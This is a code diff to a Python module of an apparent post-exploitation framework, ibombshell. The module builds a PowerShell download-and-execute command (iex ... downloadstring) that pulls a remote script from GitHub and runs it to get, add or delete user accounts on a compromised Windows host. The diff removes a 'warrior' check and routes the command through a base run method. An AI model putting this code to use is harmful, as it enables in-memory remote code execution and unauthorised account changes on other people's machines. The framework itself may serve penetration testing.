@@ -1,6 +1,5 @@
 from termcolor import cprint
 from module import Module
-from warrior_check import exist_warrior
 
 
 class CustomModule(Module):
@@ -19,23 +18,18 @@ class CustomModule(Module):
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        if exist_warrior(self.args["warrior"]):
-            function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/data/functions/post/users')"
-            op = self.args["option"]
-            if op == "get":
-                function += 'users -option get'
-            elif op != "add" and op != "del":
-                cprint("[!] Failed... wrong option", "red")
-                return
-            else:
-                if self.args["user"]:
-                    function += 'users -option ' + op + ' -user ' + self.args["user"]
-                else:
-                    cprint("[!] Failed... User?", "red")
-                    return
-            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
-                f.write(function)
-
-            cprint ('[+] Done!', 'green')
+        function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/data/functions/post/users')"
+        op = self.args["option"]
+        if op == "get":
+            function += 'users -option get'
+        elif op != "add" and op != "del":
+            cprint("[!] Failed... wrong option", "red")
+            return
         else:
-            cprint ('[!] Failed... Warrior don´t found', 'red')
+            if self.args["user"]:
+                function += 'users -option ' + op + ' -user ' + self.args["user"]
+            else:
+                cprint("[!] Failed... User?", "red")
+                return
+                
+        super(CustomModule, self).run(function)
